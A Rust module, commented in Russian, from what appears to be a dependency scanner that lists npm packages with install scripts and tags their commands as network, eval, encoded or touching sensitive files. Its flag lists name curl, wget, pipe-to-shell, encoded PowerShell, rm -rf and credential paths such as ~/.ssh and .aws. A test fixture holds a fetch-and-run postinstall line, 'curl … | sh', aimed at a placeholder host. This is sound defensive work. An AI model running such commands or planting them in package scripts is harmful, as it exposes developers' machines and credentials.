//! Что запустит `npm install` (T2.5): пакеты со скриптами установки.
//!
//! `preinstall` / `install` / `postinstall` выполняются на машине разработчика с его
//! правами — это главный путь атак через npm. Факты, а не догадки:
//! - кто: `"hasInstallScript": true` в package-lock (v2/v3) — npm сам это записал;
//! - что: команда из `node_modules/<пакет>/package.json` (если установлен);
//!   `binding.gyp` без явного скрипта → npm сам запустит `node-gyp rebuild`.
//!
//! Пометки (`network`, `eval`...) — только подсказка, где смотреть первым: совпадение
//! по подстроке, не вердикт. На код возврата скрипты не влияют.

use crate::json::{self, Json};
use crate::ui;
use std::fs;
use std::path::{Component, Path};

const HOOKS: [&str; 3] = ["preinstall", "install", "postinstall"];
const MAX_CMD_CHARS: usize = 200;

#[derive(Clone, Debug, PartialEq)]
pub struct InstallScript {
    /// lockfile, где записан пакет (относительно корня скана).
    pub lockfile: String,
    pub name: String,
    pub version: String,
    /// Только devDependencies: не ставится с `npm install --omit=dev` (прод/CI).
    pub dev: bool,
    /// (хук, команда). Пусто — пакет не установлен, команду не узнать без `npm install`.
    pub commands: Vec<(String, String)>,
    pub flags: Vec<&'static str>,
}

/// `(путь в node_modules, имя, версия, dev)` пакетов с `hasInstallScript`.
pub fn flagged_in_lock(text: &str) -> Result<Vec<(String, String, String, bool)>, String> {
    let doc = json::parse(text).map_err(|e| format!("not valid JSON: {e}"))?;
    let mut out = Vec::new();
    // v1 этого флага не хранит — там честно «неизвестно» (пустой список).
    for (path, e) in doc
        .get("packages")
        .and_then(Json::as_object)
        .into_iter()
        .flatten()
    {
        if e.get("hasInstallScript").and_then(Json::as_bool) != Some(true) {
            continue;
        }
        let Some(idx) = path.rfind("node_modules/") else {
            continue; // корень проекта / workspace — свой код
        };
        let version = e.get("version").and_then(Json::as_str).unwrap_or("");
        let name = e
            .get("name")
            .and_then(Json::as_str)
            .unwrap_or(&path[idx + "node_modules/".len()..]);
        let dev = e.get("dev").and_then(Json::as_bool) == Some(true);
        out.push((path.clone(), name.to_string(), version.to_string(), dev));
    }
    out.sort();
    Ok(out)
}

/// Путь из lockfile'а — недоверенный: только вниз, без `..` и абсолютных.
fn safe_rel(p: &str) -> bool {
    !p.is_empty()
        && !p.contains(':')
        && !p.contains('\\')
        && Path::new(p)
            .components()
            .all(|c| matches!(c, Component::Normal(_)))
}

/// Команды хуков установленного пакета.
pub fn read_commands(project_dir: &Path, pkg_path: &str) -> Vec<(String, String)> {
    if !safe_rel(pkg_path) {
        return Vec::new();
    }
    let dir = project_dir.join(pkg_path);
    let mut out = Vec::new();
    if let Some(doc) = fs::read_to_string(dir.join("package.json"))
        .ok()
        .and_then(|t| json::parse(&t).ok())
    {
        let scripts = doc.get("scripts");
        for hook in HOOKS {
            if let Some(cmd) = scripts.and_then(|s| s.get(hook)).and_then(Json::as_str) {
                out.push((hook.to_string(), clip(cmd)));
            }
        }
    }
    // npm: нет install/preinstall, но есть binding.gyp → неявный `node-gyp rebuild`.
    if !out.iter().any(|(h, _)| h == "install" || h == "preinstall")
        && dir.join("binding.gyp").is_file()
    {
        out.push((
            "install".to_string(),
            "node-gyp rebuild (implicit: binding.gyp)".to_string(),
        ));
    }
    out
}

fn clip(cmd: &str) -> String {
    let s = ui::sanitize_line(cmd.trim());
    if s.chars().count() <= MAX_CMD_CHARS {
        return s;
    }
    let mut t: String = s.chars().take(MAX_CMD_CHARS - 1).collect();
    t.push('…');
    t
}

/// Где смотреть первым. Подстроки, без регулярок и без «вердикта».
pub fn flags(commands: &[(String, String)]) -> Vec<&'static str> {
    let all: String = commands
        .iter()
        .map(|(_, c)| c.to_ascii_lowercase())
        .collect::<Vec<_>>()
        .join(" ");
    let has = |needles: &[&str]| needles.iter().any(|n| all.contains(n));
    let mut f = Vec::new();
    if has(&[
        "curl ",
        "wget ",
        "invoke-webrequest",
        "iwr ",
        "http://",
        "https://",
        "ftp://",
    ]) {
        f.push("network");
    }
    if has(&[
        "node -e",
        "node --eval",
        "eval(",
        "| sh",
        "|sh",
        "| bash",
        "|bash",
        "bash -c",
        "sh -c",
    ]) {
        f.push("eval");
    }
    if has(&[
        "base64",
        "frombase64string",
        "powershell -e",
        "powershell -enc",
        "-encodedcommand",
    ]) {
        f.push("encoded");
    }
    if has(&[
        "rm -rf",
        "del /",
        "rmdir /s",
        "chmod 777",
        "~/.ssh",
        ".npmrc",
        ".aws",
    ]) {
        f.push("touches-sensitive");
    }
    f
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn lock_flags_packages_with_install_scripts() {
        let text = r#"{"lockfileVersion":3,"packages":{
            "":{"name":"app","hasInstallScript":true},
            "node_modules/esbuild":{"version":"0.21.5","hasInstallScript":true,"dev":true},
            "node_modules/a/node_modules/@s/native":{"version":"1.0.0","hasInstallScript":true},
            "node_modules/lodash":{"version":"4.17.21"}
        }}"#;
        let got = flagged_in_lock(text).unwrap();
        assert_eq!(
            got,
            vec![
                (
                    "node_modules/a/node_modules/@s/native".into(),
                    "@s/native".into(),
                    "1.0.0".into(),
                    false
                ),
                (
                    "node_modules/esbuild".into(),
                    "esbuild".into(),
                    "0.21.5".into(),
                    true
                ),
            ]
        );
        assert!(flagged_in_lock("{nope").is_err());
    }

    #[test]
    fn reads_hooks_and_implicit_node_gyp_and_refuses_escapes() {
        let d = std::env::temp_dir().join(format!("jetscan-scripts-{}", std::process::id()));
        let _ = fs::remove_dir_all(&d);
        let pkg = d.join("node_modules/evil");
        fs::create_dir_all(&pkg).unwrap();
        fs::write(
            pkg.join("package.json"),
            r#"{"scripts":{"test":"jest","postinstall":"curl -s https://x.invalid/p | sh","preinstall":"node pre.js"}}"#,
        )
        .unwrap();
        let native = d.join("node_modules/native");
        fs::create_dir_all(&native).unwrap();
        fs::write(native.join("package.json"), r#"{"scripts":{}}"#).unwrap();
        fs::write(native.join("binding.gyp"), "{}").unwrap();

        let evil = read_commands(&d, "node_modules/evil");
        assert_eq!(
            evil,
            vec![
                ("preinstall".to_string(), "node pre.js".to_string()),
                (
                    "postinstall".to_string(),
                    "curl -s https://x.invalid/p | sh".to_string()
                ),
            ]
        );
        assert_eq!(flags(&evil), vec!["network", "eval"]);
        assert_eq!(
            read_commands(&d, "node_modules/native"),
            vec![(
                "install".to_string(),
                "node-gyp rebuild (implicit: binding.gyp)".to_string()
            )]
        );
        // Не установлен — пусто (а не выдумка).
        assert!(read_commands(&d, "node_modules/absent").is_empty());
        // Путь из lockfile'а не выходит за проект.
        assert!(read_commands(&d.join("node_modules/native"), "../evil").is_empty());
        assert!(!safe_rel("/etc") && !safe_rel("C:\\x") && !safe_rel("a/../b"));
        let _ = fs::remove_dir_all(&d);
    }

    #[test]
    fn hostile_command_text_is_neutralized_and_clipped() {
        let long = format!("echo \u{1b}[31m{}", "x".repeat(500));
        let c = clip(&long);
        assert!(!c.contains('\u{1b}'));
        assert_eq!(c.chars().count(), MAX_CMD_CHARS);
    }
}
